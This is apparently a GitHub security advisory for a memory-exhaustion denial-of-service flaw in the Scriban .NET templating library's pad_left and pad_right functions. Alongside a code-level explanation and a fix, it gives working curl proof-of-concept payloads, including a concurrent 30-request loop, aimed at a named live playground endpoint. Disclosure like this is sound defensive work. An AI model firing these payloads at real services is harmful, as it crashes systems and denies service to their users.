# [H] Scriban: Uncontrolled Memory Allocation via string.pad_left/pad_right Allows Remote Denial of Service

## Summary
Severity: High
Advisory: GHSA-v66j-x4hw-fv9g
CWE: CWE-770
Ecosystem: NuGet
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-03-24
Source: https://github.com/advisories/GHSA-v66j-x4hw-fv9g
Type: github-advisory

## Affected
- NuGet: `Scriban` — affected >=0 <7.0.0
- NuGet: `Scriban.Signed` — affected >=0 <7.0.0

## Details
## Summary

The built-in `string.pad_left` and `string.pad_right` template functions in Scriban perform no validation on the `width` parameter, allowing a template expression to allocate arbitrarily large strings in a single call. When Scriban is exposed to untrusted template input — as in the official Scriban.AppService playground deployed on Azure — an unauthenticated attacker can trigger ~1GB memory allocations with a 39-byte payload, crashing the service via `OutOfMemoryException`.

## Details

`StringFunctions.PadLeft` and `StringFunctions.PadRight` (`src/Scriban/Functions/StringFunctions.cs:1181-1203`) directly delegate to .NET's `String.PadLeft(int)` / `String.PadRight(int)` with no bounds checking:

```csharp
// src/Scriban/Functions/StringFunctions.cs:1181-1183
public static string PadLeft(string text, int width)
{
    return (text ?? string.Empty).PadLeft(width);
}

// src/Scriban/Functions/StringFunctions.cs:1200-1202
public static string PadRight(string text, int width)
{
    return (text ?? string.Empty).PadRight(width);
}
```

The `TemplateContext.LimitToString` property (default 1MB, set at `TemplateContext.cs:147`) does **not** prevent the allocation. This limit is only checked during `ObjectToString()` conversion (`TemplateContext.Helpers.cs:101-103`), which runs *after* the string has been fully allocated by `PadLeft`/`PadRight`. The dangerous allocation is the return value of a built-in function — it occurs before output rendering.

The Scriban.AppService playground (`src/Scriban.AppService/Program.cs:63-140`) exposes `POST /api/render` with:
- No authentication
- Template size limit of 1KB (line 71) — the payload fits in 39 bytes
- A 2-second timeout via `CancellationTokenSource` (line 118) — but this only cancels the `await Task.Run(...)`, not the running `template.Render()` call (line 122). The BCL `PadLeft` allocation completes atomically before the cancellation can take effect.
- Rate limiting of 30 requests/minute (line 25)

## PoC

Single request to crash or degrade the AppService:

```bash
curl -X POST https://scriban-a7bhepbxcrbkctgf.canadacentral-01.azurewebsites.net/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "{{ \u0027\u0027 | string.pad_left 500000000 }}"}'
```

This 39-byte template causes `PadLeft(500000000)` to attempt allocating a 500-million character string (~1GB in .NET's UTF-16 encoding).

**Expected result:** The service returns an error or truncated output safely.

**Actual result:** The .NET runtime attempts a ~1GB allocation. Depending on available memory, this either succeeds (consuming ~1GB until GC), or throws `OutOfMemoryException` crashing the process.

Sustained attack with rate limiting:

```bash
# 30 requests/minute × ~1GB each = ~30GB/minute of memory pressure
for i in $(seq 1 30); do
  curl -s -X POST https://scriban-a7bhepbxcrbkctgf.canadacentral-01.azurewebsites.net/api/render \
    -H "Content-Type: application/json" \
    -d '{"template": "{{ \u0027\u0027 | string.pad_left 500000000 }}"}' &
done
wait
```

The `string.pad_right` variant works identically:

```bash
curl -X POST https://scriban-a7bhepbxcrbkctgf.canadacentral-01.azurewebsites.net/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "{{ \u0027\u0027 | string.pad_right 500000000 }}"}'
```

## Impact

- **Remote denial of service** against any application that renders untrusted Scriban templates, including the official Scriban playground at `scriban-a7bhepbxcrbkctgf.canadacentral-01.azurewebsites.net`.
- An unauthenticated attacker can crash the hosting process via `OutOfMemoryException` with a single HTTP request.
- With sustained requests at the rate limit (30/min), the attacker can maintain continuous memory pressure (~30GB/min), preventing service recovery.
- The existing `LimitToString` and timeout mitigations do not prevent the intermediate memory allocation.

## Recommended Fix

Add width validation in `StringFunctions.PadLeft` and `StringFunctions.PadRight` to cap the maximum allocation. A reasonable upper bound is the `LimitToString` value from the `TemplateContext`, or a fixed maximum if the context is not available:

```csharp
// src/Scriban/Functions/StringFunctions.cs

// Option 1: Fixed reasonable maximum (simplest fix)
public static string PadLeft(string text, int width)
{
    if (width < 0) width = 0;
    if (width > 1_048_576) width = 1_048_576; // 1MB cap
    return (text ?? string.Empty).PadLeft(width);
}

public static string PadRight(string text, int width)
{
    if (width < 0) width = 0;
    if (width > 1_048_576) width = 1_048_576; // 1MB cap
    return (text ?? string.Empty).PadRight(width);
}
```

Alternatively, make the functions context-aware and use `LimitToString` as the cap, consistent with how other Scriban limits work. The AppService should also be updated to run template rendering in a memory-limited container or AppDomain to provide defense-in-depth.

## References
- https://github.com/scriban/scriban/security/advisories/GHSA-v66j-x4hw-fv9g
- https://github.com/scriban/scriban
